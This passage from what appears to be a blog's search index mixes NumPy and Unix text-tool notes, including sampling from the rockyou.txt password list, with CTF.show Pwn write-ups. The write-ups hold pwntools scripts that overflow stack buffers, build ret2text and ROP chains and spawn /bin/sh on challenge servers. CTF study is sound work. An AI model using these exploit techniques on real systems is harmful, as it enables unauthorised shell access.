= 99print(a) # a 不受影响 b = a[2:7].copy() 得到的是 拷贝： b 仍然是一个新的 ndarray 对象 且它有自己的新数据缓冲区（不共享内存） 高级索引整数数组索引（一次取多个位置）123a = np.arange(12)**2i = np.array([1, 1, 3, 8, 5])print(a[i]) 布尔索引（按条件过滤/赋值）1234a = np.arange(12).reshape(3, 4)mask = a &gt; 4a[mask] = 0print(a)","categories":[{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/en/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://archer-baiyi.github.io/en/tags/Python/"},{"name":"Numpy","slug":"Numpy","permalink":"https://archer-baiyi.github.io/en/tags/Numpy/"}]},{"title":"02 Basic Building Blocks","slug":"TUM info 笔记/Data Engeering/02-Basic-Building-Blocks","date":"2025-10-19T15:22:00.000Z","updated":"2026-01-21T12:13:05.903Z","comments":true,"path":"2025/10/19/TUM info 笔记/Data Engeering/02-Basic-Building-Blocks/","permalink":"https://archer-baiyi.github.io/en/2025/10/19/TUM%20info%20%E7%AC%94%E8%AE%B0/Data%20Engeering/02-Basic-Building-Blocks/","excerpt":"","text":"文件格式 File Formats常见的存储数据的文件格式： CSV纯文本文件，包含一行行数据（逗号分隔）。 A plain text file contains rows of data (comma separated values)。 例子： 12Sherlock Holmes,221B Baker Street,DetectiveJames Moriarty,Reichenbach Falls,Villain 简单、可读性好 非常流行、应用广 但细节很多 分隔符可自定义（如用 Tab 的 TSV） 字段里若含有分隔符需要加引用（引号） 如果字符串内部再包含引号，需要转义：&quot;string with &quot;&quot; inside&quot; 适合：扁平表格数据（行列结构），与 Excel/数据库导入导出；不适合复杂嵌套。 XML一种用于编码（半）结构化数据的文本格式。 A text format encoding (semi-)structured data。 例子 1234&lt;characters&gt;&lt;person name=“Sherlock Holmes” address=“221B Baker Street” job=“Detective”/&gt;&lt;person name=“James Moriarty” address=“Reichenbach Falls” job=“Villain”/&gt;&lt;/characters&gt; 格式本身比 CSV 标准化得更好 也适合表示嵌套数据 人类可读，但不太好手写 很冗长，完整 XML 规范也很复杂 支持高级特性（如 XML Schema），但不常用 有一定流行度，但在走下坡路 JSON源自 JavaScript 对象表示法的文本格式。 A text format stemming from JavaScript Object Notation。 例子 12345[ &#123;&quot;name&quot;:&quot;Sherlock Holmes&quot;, &quot;address&quot;:&quot;221B Baker Street&quot;, &quot;job&quot;:&quot;Detective&quot;&#125;, &#123;&quot;name&quot;:&quot;James Moriarty&quot;, &quot;address&quot;:&quot;Reichenbach Falls&quot;, &quot;job&quot;:&quot;Villain&quot;&#125;] 用途与 XML 类似 但格式更简单 更不啰嗦（verbose）、更易书写 正在变得越来越流行 命令行工具 Command Line ToolsText files are quite popular because they are human readable and easy to use. 这部分主要讲如何利用命令行工具处理txt文件。 组合工具（Combining Tools）每个程序都有一个输入流（input stream）以及输出流（output stream）。可以将多个命令组合起来： 把两个命令连接起来（Concatenating both）： 1command 1 | command 2 把输出重定向到文件（Redirecting to a file）： 1command &gt; file 从文件重定向为输入（Redirecting from a file）： 1command &lt; file 错误流（error stram）： 1command 2 &gt; /dev/null Unix 流编号：0—标准输入 stdin，1—标准输出 stdout，2—标准错误 stderr。 把 command 的错误流重定向到空设备 /dev/null（像“黑洞”一样，会丢弃输入）。 读取文件（Reading Files）： cat 读取单个文件： 1cat file 连接多个文件： 1cat file1 file2 file3 接受管道输入： 1command | cat 转义/可视化二进制数据： 1cat -v binaryfile 处理压缩文件： 1zcat / bzcat / xzcat 主要用作其他命令的输入 分页查看结果（Paging reults）：less 用于检查结果或文件，分页显示，可向前向后滚动。 在管道中通常用作最后一个命令。 分页命令输出： 1command | less 分页查看文件： 1less file 截断长行： 1less -S 过滤（Filtering）：grep 返回所有匹配行——功能强大、选项众多。 过滤输入： 1cat file1 file2 | grep &#x27;img[0-9]*\\.jpg&#x27; 过滤文件： 1grep &#x27;img[0-9]*\\.jpg&#x27; *.html 只返回匹配片段： 1command | grep -o &#x27;user=.*$&#x27; 返回不匹配的行： 1grep -v &#x27;^warning&#x27; logfile 不区分大小写： 1cat file | grep -i &#x27;\\.jpg&#x27; file 排序（Sorting）：sort 按某种准则对输入排序： 基本排序： 1cat file | sort 数字排序： 1cat file | sort -n 按特定键排序： 1cat file | sort -k 2 以第 2 列开始直到行尾作为排序键进行排序（默认字典序，升序，按空白分隔列；多个空格/Tab 会被合并为一个分隔符，前导空白被忽略）。 指定分隔符排序： 1cat file | sort -t &#x27;,&#x27; -k 3 把逗号当作列分隔符，用从第3列到行尾的内容按字典序排序。 排序并去重： 1cat file | sort -u 非常强大且有用 能处理大于内存的文件 已排序的文件可作为其他算法的输入 选前/后缀（Selecting Prefix/Sufix）：head / tail 返回文件开头/结尾： 前 20 条： 1head -20 file 1sort file | head -20 这两条命令的结果是不一样的 后 15 条： 1sort file | tail -15 除前两条外的全部： 1sort file | tail -n +3 除最后两条外的全部： 1sort file | head -n -2 这些都是top-k查询——先排序再 head/tail。 也可用于最小/最大值计算。 处理重复（Handling Duplicates）：uniq 处理已排序输入中的重复： 去重： 1sort file | uniq 计数重复： 1sort file | uniq -c 仅返回重复行： 1sort file | uniq -d 仅返回唯一行： 1sort file | uniq -u 对分组与计数很有用 投影列（Projection Columns）：cut 语法： 1cut OPTION... [FILE]... 只返回输入中相关部分： 返回特定字段： 1cat file | cut -f 1,3 指定分隔符切分： 1cat file | cut -f 2-4 -d &#x27;,&#x27; 按字符位置切分： 1cat file | cut -c 1-10 计数（Counting）：wc 统计行/词/字符数量： 全量统计： 1cat file | wc 只数行数： 1cat file | wc -l 只数字节数： 1cat file | wc -c 有助于收集数据统计。 乱序（Shuffling）：shuf 将输入的行打乱生成随机排列： 随机顺序： 1cat file | shuf 不太常用，但在某些场景很有用： 随机抽样： 1cat file | shuf | head -10000 适合性能测试。 从rockyou.txt里随机选一个： 1shuf rockyou.txt -n 1 从rockyou.txt的500到1000行记录里随机选一个： 1sed -n &#x27;500,1000p&#x27; rockyou.txt | shuf -n 1 编辑文本（Editing Text）：sed替换 语法： 1sed &#x27;s/regex/repl/flags&#x27; s 是 substitute（替换）的意思。 第 1 个分隔符后是正则（要匹配的内容），第 2 个分隔符后是替换文本，最后是标志位（可选）。 默认每行只替换第 1 处匹配；加 g 才是“本行全替”。 &amp; 在替换文本里表示“整段匹配的内容”；\\1、\\2… 表示捕获组。 sed 的默认正则是 BRE（Basic Regular Expressions）：分组要写 \\( \\)；如果用 -E（或 GNU -r），就变成 ERE 分组可用 ( )。 用一个文本替换另一个文本： 基本替换： 123cat file | sed &#x27;s/oldText/newText/&#x27;sed &#x27;s/oldText/newText/&#x27; file 对每一行，把第一次出现的 oldText 替换成 newText。只影响每行第一个匹配，后面的同一行匹配保持不变。 替换所有出现： 1cat file | sed &#x27;s/oldText/newText/g&#x27; 反向引用： 1cat file | sed &#x27;s/IMG_\\([0-9]*\\).JPG/image\\1.jpg/g&#x27; 把诸如 IMG_123.JPG 转为 image123.jpg。 IMG_：字面匹配。 \\([0-9]*\\)：捕获组（因为是 BRE 要写 \\( \\)）。匹配零个或多个数字；匹配到的数字被记为组 1。 替换串 image\\1.jpg：把组 1（即数字）插回去。 g：该行所有匹配都替换。 不区分大小写匹配： 1cat file | sed &#x27;s/file[0-9]*.png/&quot;&amp;&quot;/I&#x27; 使用多个规则： 1cat file | sed -e &#x27;s/old1/new1/&#x27; -e &#x27;s:a/b:a_b:&#x27; 极其强大且有用； 还有分组、条件分支等更多特性，但很少用。 打印在sed中，p代表Print（打印）。 例子： 输出rockyou.txt的500到1000行记录： 1sed -n &#x27;500,1000p&#x27; rockyou.txt 合并文件（Combining Files）：join 合并已排序输入文件： 按公共字段合并两个文件： 1join -1 2 -2 1 file1 file2 用 file1 的第2列与 file2 的第1列作为“键”做内连接 -1 2：指定 file1 的键列是第 2 列。 -2 1：指定 file2 的键列是第 1 列。 没有指定分隔符 ⇒ 用空白切列；多个空白算一个分隔；前导空白被忽略。 没有 -a/-v ⇒ 内连接（仅输出两边都出现的键）。 指定分隔符合并： 1join -1 2 -2 1 -d &#x27;,&#x27; file1 file2 保留未匹配行（-a）： 1join -1 2 -2 1 -a 1 file1 file2 行为类似关系型连接；但如果需要更强功能，可能应使用更强大的工具。 选项说明： -1 FIELD：file1 以该字段连接；-2 FIELD：file2 以该字段连接 -a 1 左外连接；-a 2 右外连接；-a 1 -a 2 全外连接 -v 抑制已连接的输出行：-v 1 左反连接；-v 2 右反连接 计算（Computation）：awk 为输入的每一行执行程序： 通用结构： 1awk &#x27;BEGIN&#123;init&#125;&#123;per-line&#125;END&#123;done&#125;&#x27; file 计数行数： 1awk &#x27;BEGIN&#123;x=0&#125;&#123;x=x+1&#125;END&#123;print x&#125;&#x27; 累加某列： 1awk &#x27;BEGIN&#123;x=0&#125;&#123;x=x+$2&#125;END&#123;print x&#125;&#x27; 求某列平均： 1awk &#x27;BEGIN&#123;x=0;y=0&#125;&#123;x+=\\$2;y+=1&#125;END&#123;print x/y&#125;&#x27; 条件： 1awk &#x27;BEGIN&#123;x=0&#125;&#123;if ($1&gt;10) x+=\\$2&#125;END&#123;print x&#125;&#x27;","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"Data Engeneering","slug":"TUM-info-课程笔记/Data-Engeneering","permalink":"https://archer-baiyi.github.io/en/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Data-Engeneering/"}],"tags":[{"name":"Data Engeneering","slug":"Data-Engeneering","permalink":"https://archer-baiyi.github.io/en/tags/Data-Engeneering/"},{"name":"bash","slug":"bash","permalink":"https://archer-baiyi.github.io/en/tags/bash/"},{"name":"GNU Coreutils","slug":"GNU-Coreutils","permalink":"https://archer-baiyi.github.io/en/tags/GNU-Coreutils/"}]},{"title":"医学常用德语单词","slug":"杂/医学常用德语单词","date":"2025-10-06T20:49:57.000Z","updated":"2025-10-20T18:49:22.465Z","comments":true,"path":"2025/10/06/杂/医学常用德语单词/","permalink":"https://archer-baiyi.github.io/en/2025/10/06/%E6%9D%82/%E5%8C%BB%E5%AD%A6%E5%B8%B8%E7%94%A8%E5%BE%B7%E8%AF%AD%E5%8D%95%E8%AF%8D/","excerpt":"","text":"症状 中 德 痰 Der Schleim 炎症 Entzündung 部位 中 德 扁桃体 Die Mandel 药 中 德 布洛芬 Ibuprofen","categories":[{"name":"杂","slug":"杂","permalink":"https://archer-baiyi.github.io/en/categories/%E6%9D%82/"}],"tags":[{"name":"德语，医药","slug":"德语，医药","permalink":"https://archer-baiyi.github.io/en/tags/%E5%BE%B7%E8%AF%AD%EF%BC%8C%E5%8C%BB%E8%8D%AF/"}]},{"title":"CTF.show Pwn入门","slug":"CTF/Pwn/CTF-show-Pwn入门","date":"2025-10-04T18:16:54.000Z","updated":"2025-10-29T20:44:58.083Z","comments":true,"path":"2025/10/04/CTF/Pwn/CTF-show-Pwn入门/","permalink":"https://archer-baiyi.github.io/en/2025/10/04/CTF/Pwn/CTF-show-Pwn%E5%85%A5%E9%97%A8/","excerpt":"","text":"前置基础Pwn5 先查看文件，发现是elf文件，然后给它加上运行权限并运行它。（注意，在Linux中这种外来文件如果不专门添加运行权限我们是无法运行它的。） 1234567└─$ file Welcome_to_CTFshowWelcome_to_CTFshow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped└─$ chmod +x Welcome_to_CTFshow└─$ ./Welcome_to_CTFshowWelcome_to_CTFshow_PWN 所以flag为： 1ctfshow&#123;Welcome_to_CTFshow_PWN&#125; Pwn6 我们先来仔细地看一下这个程序（利用IDA的反编译）：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public start ; 声明入口符号 start（程序入口点）start proc near mov eax, 0Bh ; EAX = 0Bh (十进制 11) add eax, 1BF48h ; EAX = EAX + 0x1BF48 （即 EAX = 0x1BF48 + 11） sub eax, 1 ; EAX = EAX - 1 mov ebx, 36Dh ; EBX = 0x36D (十进制 877) mov edx, ebx ; EDX = EBX = 0x36D mov ecx, dword ptr aWelcomeToCtfsh ; ECX = 内存中存放的字符串地址前 4 字节 ; 这其实会把字符串 “Welcome_to_CTFshow_PWN” 的前四个字节当作整数加载 mov esi, offset aWelcomeToCtfsh ; ESI = &quot;Welcome_to_CTFshow_PWN&quot; 的地址 mov eax, [esi] ; EAX = 前 4 个字节 (即 &quot;Welc&quot;) mov ecx, offset aWelcomeToCtfsh ; 再次将 ECX 置为字符串地址 add ecx, 4 ; ECX = ECX + 4，跳过前 4 字节 (&quot;Welc&quot;) mov eax, [ecx] ; EAX = 下一个 4 字节 (&quot;ome_&quot;) mov ecx, offset aWelcomeToCtfsh ; 再次装入字符串地址 mov edx, 2 mov eax, [ecx+edx*2] ; EAX = [aWelcome_to_CTFshow_PWN + 4]，效果类似上一步 mov ecx, offset aWelcomeToCtfsh mov edx, 1 add ecx, 8 mov eax, [ecx+edx*2-6] ; 这些多次 mov 的操作都是冗余的，可能是故意混淆或干扰反汇编阅读 ; 实际对最终输出没有影响 ; --- 以下是真正有意义的代码部分 --- mov eax, 4 ; 系统调用号 4：sys_write mov ebx, 1 ; 文件描述符 1：stdout mov ecx, offset aWelcomeToCtfsh ; ECX = 要输出的字符串地址 mov edx, 16h ; EDX = 要写的长度（0x16 = 22 字节） int 80h ; 调用内核：write(1, &quot;Welcome_to_CTFshow_PWN&quot;, 22) mov eax, 1 ; 系统调用号 1：sys_exit xor ebx, ebx ; EBX = 0（退出状态码 0） int 80h ; 调用内核：exit(0)start endp_text ends 定义:立即寻址（Immediate Addressing）是指：指令中的操作数本身就是常量（立即数），该常量直接编码在指令内，CPU 取出指令即可得到该值，无需再访问寄存器或内存取数。 这段代码中立即寻址的部分是： 12345mov eax, 0Bhadd eax, 1BF48hsub eax, 1mov ebx, 36Dh ; 这行跟eax没有关系，所以可以忽略。 0Bh，1BF48h的h都是十六进制的后缀，所以这段内容相当于： 12345eax = 0x0000000Beax += 0x0001BF48 # =0x0001BF53eax -= 1 # =0x0001BF52=114514 所以flag为： 1ctfshow&#123;114514&#125; 栈溢出Pwn35 检查一下文件的保护措施： 12345678└─$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No 1234567891011121314151617$ lspwnme$ ./pwnme ▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄ ██▀▀▀▀█ ▀▀▀██▀▀▀ ██▀▀▀▀▀▀ ██ ██▀ ██ ██ ▄▄█████▄ ██▄████▄ ▄████▄ ██ ██ ██ ██ ███████ ██▄▄▄▄ ▀ ██▀ ██ ██▀ ▀██ ▀█ ██ █▀ ██▄ ██ ██ ▀▀▀▀██▄ ██ ██ ██ ██ ██▄██▄██ ██▄▄▄▄█ ██ ██ █▄▄▄▄▄██ ██ ██ ▀██▄▄██▀ ▀██ ██▀ ▀▀▀▀ ▀▀ ▀▀ ▀▀▀▀▀▀ ▀▀ ▀▀ ▀▀▀▀ ▀▀ ▀▀ * ************************************* * Classify: CTFshow --- PWN --- 入门 * Type : Stack_Overflow * Site : https://ctf.show/ * Hint : See what the program does! * *************************************Where is flag? 看一下这个ctfshow函数： 123456char *__cdecl ctfshow(char *src)&#123; char dest[104]; // [esp+Ch] [ebp-6Ch] BYREF return strcpy(dest, src);&#125; 不难发现常见的漏洞函数strcpy，但该怎么利用它呢？ 注意到这一行： 1signal(11, (__sighandler_t)sigsegv_handler); 123456void __noreturn sigsegv_handler()&#123; fprintf(stderr, &quot;%s\\n&quot;, flag); fflush(stderr); exit(1);&#125; signal(11, (__sighandler_t)sigsegv_handler); 11 是 POSIX 信号号 SIGSEGV（段错误 / segmentation fault）。 signal(signum, handler) 用来注册信号处理函数：当进程收到 signum 信号时，内核会中断当前执行流并跳到 handler。 这里把 sigsegv_handler 注册为 SIGSEGV 的处理器 —— 当程序发生段错误（例如非法内存访问或访问保护页）时不会按默认行为终止并打印 core，而是去执行这个自定义处理函数。 (__sighandler_t) 是一个类型转换，把 sigsegv_handler 强制转为 signal 期待的函数指针类型，以避免编译器类型不匹配的警告（通常 signal 要求特定签名 void (*)(int)，而这里 handler 定义不带参数，所以做了 cast）。 fprintf(stderr, &quot;%s\\n&quot;, flag); 把全局或外部变量 flag 当作字符串，写到标准错误流 stderr。fprintf 会格式化并写入缓冲区，最终通过底层 write 输出到终端或重定向的目标。 fflush(stderr); 强制把 stderr 的缓冲区刷出到文件描述符，确保输出立刻可见（尤其是当 stderr 被行缓冲或全缓冲时）。 由于 stderr 常常是行缓冲/无缓冲，fflush 可提高输出可靠性，确保在随后退出前内容已写出。 简单总结一下： 当 strcpy(dest, src) 写出栈边界并产生段错误时，内核发送 SIGSEGV，程序控制流会跳到 sigsegv_handler。handler 里会将flag写到stderr，然后退出程序。 也就是说我们只需要想办法利用Buffer Overflow触发segmentation fault，便可以得到flag。 因为给dest分配的是104个字节，所以我们直接输入105个字节即可。 12&gt;&gt;&gt; print(&quot;A&quot;*105)AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 1234567891011121314151617$ ./pwnme AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄ ██▀▀▀▀█ ▀▀▀██▀▀▀ ██▀▀▀▀▀▀ ██ ██▀ ██ ██ ▄▄█████▄ ██▄████▄ ▄████▄ ██ ██ ██ ██ ███████ ██▄▄▄▄ ▀ ██▀ ██ ██▀ ▀██ ▀█ ██ █▀ ██▄ ██ ██ ▀▀▀▀██▄ ██ ██ ██ ██ ██▄██▄██ ██▄▄▄▄█ ██ ██ █▄▄▄▄▄██ ██ ██ ▀██▄▄██▀ ▀██ ██▀ ▀▀▀▀ ▀▀ ▀▀ ▀▀▀▀▀▀ ▀▀ ▀▀ ▀▀▀▀ ▀▀ ▀▀ * ************************************* * Classify: CTFshow --- PWN --- 入门 * Type : Stack_Overflow * Site : https://ctf.show/ * Hint : See what the program does! * *************************************Where is flag?ctfshow&#123;5f912424-3426-45dd-9966-84c4247d058b&#125; Pwn36 12345678910└─$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn36/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x8048000) Stack: Executable RWX: Has RWX segments Stripped: No 123456789101112131415161718192021int __cdecl main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0, 2, 0); puts(asc_804883C); puts(asc_80488B0); puts(asc_804892C); puts(asc_80489B8); puts(asc_8048A48); puts(asc_8048ACC); puts(asc_8048B60); puts(&quot; * ************************************* &quot;); puts(aClassifyCtfsho); puts(&quot; * Type : Stack_Overflow &quot;); puts(&quot; * Site : https://ctf.show/ &quot;); puts(&quot; * Hint : There are backdoor functions here! &quot;); puts(&quot; * ************************************* &quot;); puts(&quot;Find and use it!&quot;); puts(&quot;Enter what you want: &quot;); ctfshow(&amp;argc); return 0;&#125; 依旧查看最核心的ctfshow()函数： 123456char *ctfshow()&#123; char s[36]; // [esp+0h] [ebp-28h] BYREF return gets(s);&#125; 发现漏洞gets()。 查看Stack结构： 在Exports里发现一个可疑的函数get_flag()： 1234567891011121314int get_flag()&#123; char s[64]; // [esp+Ch] [ebp-4Ch] BYREF FILE *stream; // [esp+4Ch] [ebp-Ch] stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;); if ( !stream ) &#123; puts(&quot;/ctfshow_flag: No such file or directory.&quot;); exit(0); &#125; fgets(s, 64, stream); return printf(s);&#125; 这个函数会直接打印flag内容。 所以我们可以利用Buffer Overflow的漏洞修改返回地址调用这个函数。 123456789101112from pwn import *r = remote(&quot;pwn.challenge.ctf.show&quot;, 28180)get_flag = p32(0x08048586)payload = b&quot;A&quot;*40 + b&quot;B&quot;*4 + get_flag + b&quot;\\n&quot;r.sendafter(&quot;Enter what you want:&quot;,payload)r.interactive()# ctfshow&#123;89602abf-e798-4ebd-b48b-3e300905a6fa&#125; Pwn37 12345678└─$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn37/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; init(&amp;argc); logo(); puts(&quot;Just very easy ret2text&amp;&amp;32bit&quot;); ctfshow(); puts(&quot;\\nExit&quot;); return 0;&#125; 123456ssize_t ctfshow()&#123; _BYTE buf[14]; // [esp+6h] [ebp-12h] BYREF return read(0, buf, 0x32u);&#125; 可以发现这里read()函数设置的参数有问题，读取的内容长度远大于buf的长度。 栈结构： 查看Exports，发现一个backdoor()函数： 12345int backdoor()&#123; system(&quot;/bin/sh&quot;); return 0;&#125; 所以我们直接利用Buffer Overflow覆盖掉buf并将返回地址修改为backdoor函数的地址即可。 1234567891011121314from pwn import *r = remote(&quot;pwn.challenge.ctf.show&quot;, 28105)backdoor = p32(0x08048521)payload = b&quot;A&quot;*(16+2) + b&quot;B&quot;*4 + backdoor + b&quot;\\n&quot;r.sendafter(&quot;Just very easy ret2text&amp;&amp;32bit&quot;,payload)r.sendline(&quot;cat ctfshow_flag&quot;)r.interactive()# ctfshow&#123;64195e89-1576-4a46-94df-fc156c7d0dd2&#125; Pwn38 12345678└─$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn38/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No 12345678910111213141516171819202122int __fastcall main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); puts(s); puts(asc_400890); puts(asc_400910); puts(asc_4009A0); puts(asc_400A30); puts(asc_400AB8); puts(asc_400B50); puts(&quot; * ************************************* &quot;); puts(aClassifyCtfsho); puts(&quot; * Type : Stack_Overflow &quot;); puts(&quot; * Site : https://ctf.show/ &quot;); puts(&quot; * Hint : It has system and &#x27;/bin/sh&#x27;.There is a backdoor function&quot;); puts(&quot; * ************************************* &quot;); puts(&quot;Just easy ret2text&amp;&amp;64bit&quot;); ctfshow(); puts(&quot;\\nExit&quot;); return 0;&#125; 123456ssize_t ctfshow()&#123; _BYTE buf[10]; // [rsp+6h] [rbp-Ah] BYREF return read(0, buf, 0x32uLL);&#125; 和上一题基本上一模一样。 但最核心的区别在于：由于backdoor函数里会使用call命令，所以我们这里需要保证栈对齐（stack alignment）。因为x86_64 System V ABI 要求：在执行 call 指令之前，RSP 必须 16 字节对齐。 所以需要额外使用一个ret命令，即将原本的返回地址修改为ret命令的地址，然后跟上backdoor函数的地址。 1234567891011121314151617181920from pwn import *r = remote(&quot;pwn.challenge.ctf.show&quot;, 28136)elf = ELF(&#x27;./pwn&#x27;)# 找 ret 指令rets_iter = elf.search(asm(&#x27;ret&#x27;))ret_addr = next(rets_iter)ret = p64(ret_addr)backdoor = p64(0x0000000000400657)payload = b&quot;A&quot;*(10+8) + ret + backdoor + b&quot;\\n&quot;r.sendafter(&quot;Just easy ret2text&amp;&amp;64bit&quot;,payload)r.sendline(&quot;cat ctfshow_flag&quot;)r.interactive()# ctfshow&#123;90f8e2c6-c456-4a17-92b3-1ff6e2db4cd9&#125; 32-bit的基本对齐单位是4字节：返回地址与栈帧管理以4的倍数移动 -&gt; 对齐稳定、问题少。64-bit的ABI要求16字节对齐，但 call/ret 的变化是8字节 -&gt; RSP 会在(0 mod 16)与(8 mod 16)两种状态间切换 。 Pwn39 12345678└─$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn39/pwn&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Stripped: No 12345678910111213141516171819202122int __cdecl main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); puts(asc_804876C); puts(asc_80487E0); puts(asc_804885C); puts(asc_80488E8); puts(asc_8048978); puts(asc_80489FC); puts(asc_8048A90); puts(&quot; * ************************************* &quot;); puts(aClassifyCtfsho); puts(&quot; * Type : Stack_Overflow &quot;); puts(&quot; * Site : https://ctf.show/ &quot;); puts(&quot; * Hint : It has system and &#x27;/bin/sh&#x27;,but they don&#x27;t work together&quot;); puts(&quot; * ************************************* &quot;); puts(&quot;Just easy ret2text&amp;&amp;32bit&quot;); ctfshow(&amp;argc); puts(&quot;\\nExit&quot;); return 0;&#125; 还是一样的漏洞： 123456ssize_t ctfshow()&#123; _BYTE buf[14]; // [esp+6h] [ebp-12h] BYREF return read(0, buf, 0x32u);&#125; 并且发现一个奇怪的hint()函数： 12345int hint()&#123; puts(&quot;/bin/sh&quot;); return system(&quot;echo &#x27;You find me?&#x27;&quot;);&#125; 找到&quot;/bin/sh&quot;字符串的地址： 所以思路如下：将返回地址修改为system函数，并将&quot;/bin/sh&quot;作为参数传递给system。 123456789101112131415161718from pwn import *r = remote(&quot;pwn.challenge.ctf.show&quot;, 28309)elf = ELF(&#x27;./pwn&#x27;)system = p32(0x080483A0)# system = p32(elf.sym[&#x27;system&#x27;])bin_sh = p32(0x08048750)payload = b&quot;A&quot;*(0x12+4) + system + p32(0) + bin_sh + b&quot;\\n&quot;r.sendafter(&quot;Just easy ret2text&amp;&amp;32bit&quot;,payload)r.sendline(&quot;cat ctfshow_flag&quot;)r.interactive()# ctfshow&#123;e62b2132-b552-439b-992f-7965c0d65d4f&#125; 这个p32(0)其实就是给 system 函数占位的假返回地址。它是必须的，因为在32-bit的调用约定里函数的参数是放在栈上的，且在函数入口处第一个参数位于 ESP+4（ESP 指向返回地址）。 Pwn40 12345678└─$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn40/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No 12345678910111213141516171819202122int __fastcall main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); puts(asc_400828); puts(asc_4008A0); puts(asc_400920); puts(asc_4009B0); puts(asc_400A40); puts(asc_400AC8); puts(asc_400B60); puts(&quot; * ************************************* &quot;); puts(aClassifyCtfsho); puts(&quot; * Type : Stack_Overflow &quot;); puts(&quot; * Site : https://ctf.show/ &quot;); puts(&quot; * Hint : It has system and &#x27;/bin/sh&#x27;,but they don&#x27;t work together&quot;); puts(&quot; * ************************************* &quot;); puts(&quot;Just easy ret2text&amp;&amp;64bit&quot;); ctfshow(); puts(&quot;\\nExit&quot;); return 0;&#125; 123456ssize_t ctfshow()&#123; _BYTE buf[10]; // [rsp+6h] [rbp-Ah] BYREF return read(0, buf, 0x32uLL);&#125; 这道题的思路同样是想办法调用system()函数并传入/bin/sh作为参数。 利用pwntools可以确定这个程序某个地方使用了pop rdi ; ret命令并可以找到它的地址。 1234567from pwn import *elf = ELF(&#x27;./pwn&#x27;)pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))# print(pop_rdi)# 4196323 可以确定这个程序某个地方使用了pop rdi ; ret命令并可以找到它的地址。 先来解释一下这个命令：pop rdi ; ret 会从当前栈顶取出一个值放入 rdi 寄存器（即函数第 1 个参数），然后跳转到下一个地址继续执行。 在 x86-64 System V 调用约定中，函数的第一个参数通过 rdi 传递，它传的是值，不是地址；如果这个值是地址类型（如指针），函数内部才会用它当作地址来读取内容。 而ret命令具体执行的内容是： 从 [rsp] 取 8 字节 → 赋值给 rip（指令指针） rsp += 8 所以我们可以利用这个命令构造一条这样的ROP链： 1234567891011pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))# print(pop_rdi)# 4196323bin_sh = p64(0x400808)ret = p64(next(elf.search(asm(&#x27;ret&#x27;, arch=&#x27;amd64&#x27;))))system = p64(elf.sym[&#x27;system&#x27;])payload = b&quot;A&quot;*(0xA+8) + pop_rdi + bin_sh + ret + system + b&quot;\\n&quot; 与之前一样，这里的ret同样是为了保证Stack对齐。 1234567891011121314151617181920212223242526from pwn import *r = remote(&quot;pwn.challenge.ctf.show&quot;, 28310)elf = ELF(&#x27;./pwn&#x27;)pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))# print(pop_rdi)# 4196323bin_sh = p64(0x400808)ret = p64(next(elf.search(asm(&#x27;ret&#x27;, arch=&#x27;amd64&#x27;))))system = p64(elf.sym[&#x27;system&#x27;])payload = b&quot;A&quot;*(0xA+8) + pop_rdi + bin_sh + ret + system + b&quot;\\n&quot;r.sendafter(&quot;Just easy ret2text&amp;&amp;64bit&quot;,payload)r.sendline(&quot;cat ctfshow_flag&quot;)r.interactive()# ctfshow&#123;ecc4ad83-cec6-4ea9-af2e-47230707655a&#125; Pwn42 12345678└─$ checksec pwn[*] &#x27;/home/archer/ctf-kali/pwn/pwn42/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No 